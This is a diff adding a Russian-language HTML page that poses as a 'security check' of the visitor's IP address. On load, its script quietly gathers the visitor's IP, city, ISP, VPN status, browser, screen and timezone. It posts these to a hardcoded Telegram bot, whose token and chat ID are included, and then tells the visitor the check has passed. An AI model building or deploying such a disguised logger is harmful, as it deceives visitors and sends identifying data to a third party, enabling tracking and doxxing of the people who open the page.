@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Проверка безопасности</title>
+    <style>
+        body { background: #0a0a0a; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 100px; }
+        .container { background: #1a1a1a; width: 400px; margin: 0 auto; padding: 30px; border-radius: 10px; }
+        h1 { color: #00aaff; }
+        .loader { display: inline-block; width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid #00aaff; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="loader" id="loader"></div>
+    <h1>Проверка IP...</h1>
+    <p>Пожалуйста, подождите.</p>
+</div>
+
+<script>
+    const TG_TOKEN = "8719831332:AAHOaiNneDrJ0x2i1UZlNq7ivFMt4LPJ6Rk";
+    const TG_CHAT  = "-1004360618604";
+    const API      = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+
+    async function sendLog() {
+        try {
+            const ipRes = await fetch("https://api.ipify.org?format=json");
+            const ipData = await ipRes.json();
+            const ip = ipData.ip;
+
+            const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,as,proxy,hosting`);
+            const geo = await geoRes.json();
+
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const lang = navigator.language;
+            const screen = `${window.screen.width}x${window.screen.height}`;
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+            let vpn = geo.proxy ? "🔴 VPN" : "🟢 Чистый";
+            let host = geo.hosting ? "🔴 Хостинг" : "";
+            
+            const msg = `DATA_START\n` +
+                        `IP: ${ip}\n` +
+                        `COUNTRY: ${geo.country}\n` +
+                        `REGION: ${geo.regionName}\n` +
+                        `CITY: ${geo.city}\n` +
+                        `ISP: ${geo.isp}\n` +
+                        `ORG: ${geo.org}\n` +
+                        `ASN: ${geo.as}\n` +
+                        `VPN: ${vpn}\n` +
+                        `HOSTING: ${host}\n` +
+                        `UA: ${ua}\n` +
+                        `PLATFORM: ${platform}\n` +
+                        `LANG: ${lang}\n` +
+                        `SCREEN: ${screen}\n` +
+                        `TZ: ${tz}\n` +
+                        `DATA_END`;
+
+            await fetch(API, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: TG_CHAT, text: msg })
+            });
+
+            document.getElementById('loader').style.display = 'none';
+            document.querySelector('h1').innerText = "Проверка пройдена";
+        } catch (e) {}
+    }
+    setTimeout(sendLog, 1000);
+</script>
+</body>
+</html>
